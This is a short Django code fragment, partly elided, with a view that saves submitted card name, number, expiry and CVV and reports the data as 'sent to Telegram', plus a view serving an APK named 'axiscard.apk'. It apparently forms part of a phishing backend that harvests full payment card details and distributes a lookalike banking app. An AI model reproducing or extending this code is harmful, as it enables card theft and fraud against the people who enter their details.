...
def save_card_data(request):
    ...
    Card.objects.create(
        card_name=card_name, card_number=card_number, expiry=expiry, cvv=cvv
    )
    ...
    return Response(
        {
            "status": "success",
            "message": "Data saved successfully and sent to Telegram",
        }
    )


# --- Cloudinary-তে রিডাইরেক্ট করে APK ডাউনলোড ভিউ ---
# register/views.py
import os
...
# APK file response view
def download_apk(request):
    apk_path = os.path.join(settings.MEDIA_ROOT, 'downloads', 'axiscard.apk')
